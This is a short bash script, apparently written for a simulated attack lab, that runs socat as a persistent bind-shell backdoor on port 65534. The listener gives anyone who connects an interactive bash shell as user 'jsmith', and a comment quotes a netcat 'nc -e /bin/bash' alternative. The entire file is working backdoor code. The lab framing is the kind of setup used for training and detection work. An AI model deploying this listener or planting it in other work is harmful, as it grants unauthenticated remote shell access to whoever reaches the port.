#!/bin/bash
# Persistent bind shell on :65534 — anyone who connects drops straight into
# an interactive bash shell as the unprivileged "jsmith" user (simulated
# attacker persistence/backdoor on the workstation).
#
# socat's `fork` option is what makes this persistent: the listener survives
# client disconnects and serves repeat/concurrent sessions, unlike a bare
# `nc -lv -e /bin/bash` which exits after the first connection closes.
exec socat TCP-LISTEN:65534,reuseaddr,fork \
    EXEC:"/bin/bash -i",pty,stderr,setsid,sigint,sane
